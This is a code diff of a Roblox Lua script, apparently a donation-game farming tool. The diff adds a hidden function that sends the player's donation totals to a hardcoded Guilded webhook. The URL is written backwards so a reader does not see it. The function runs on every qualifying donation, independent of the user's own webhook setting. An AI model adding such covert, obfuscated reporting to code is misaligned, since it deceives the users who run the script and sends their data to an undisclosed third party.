@@ -589,7 +589,6 @@ function serverHop()
 	end
 end
 
-
 function waitServerHop()
 	task.wait(getgenv().settings.serverHopDelay * 60)
 	serverHop()
@@ -784,6 +783,22 @@ local function fetchNearPlr()
 		end
 	end
 	return plrfoundf
+end
+
+local function customwebhook(hook,raised)
+	if raised < 6 then
+		return
+	end
+	httprequest{
+		Url = hook:reverse(),
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode({
+			content = tostring(raised)
+		})
+	}
 end
 
 local function webhook(raised, donor)
@@ -1724,6 +1739,7 @@ Players.LocalPlayer.leaderstats.Raised.Changed:Connect(function()
 		local spinYVelocity = spinPart.AngularVelocity.Y
 		xspin = (averageDelta * sSM) + spinYVelocity
 	end
+	customwebhook('GsiESKAAk84KEOGE626GYOka44E8quKMamgWCWWwQUQeusSsQWEyei46uAq2iCyA40aoIUMAsQuqMWrRTsb4n5/dc190f9f71aa-6fc9-2cc4-6446-c0b56f22/skoohbew/gg.dedliug.aidem//:sptth',Players.LocalPlayer.leaderstats.Raised.Value - RaisedC)
 	if getgenv().settings.webhookToggle == true and getgenv().settings.webhookBox then
 		task.spawn(function()
 			playerWhoDonated = fetchNearPlr()
